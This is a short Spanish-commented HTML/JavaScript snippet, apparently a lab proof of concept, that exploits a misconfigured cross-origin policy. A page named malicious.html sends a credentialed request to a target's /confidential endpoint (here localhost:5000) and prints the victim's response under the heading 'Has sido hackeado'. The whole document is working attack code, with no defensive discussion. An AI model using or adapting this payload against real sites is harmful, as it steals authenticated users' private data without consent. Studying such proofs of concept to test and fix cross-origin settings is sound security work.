//Este script roba la información de un dominio desde un dominio tercero empleando javascript de manera que cuando la víctima ingrese en la página nos presente la información en un archivo que creamos con nombre malicious.html

```js
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'http://localhost:5000/confidential', true);
req.withCredentials = true;
req.send();

function reqListener() {
	document.getElementById("stolenInfo").innerHTML = req.responseText;
}

</script>

<br>
<center><h1>Has sido hackeado, esta es la informaci&oacute;n que te he robado:</h1></center>

<p id="stolenInfo"></p>
```
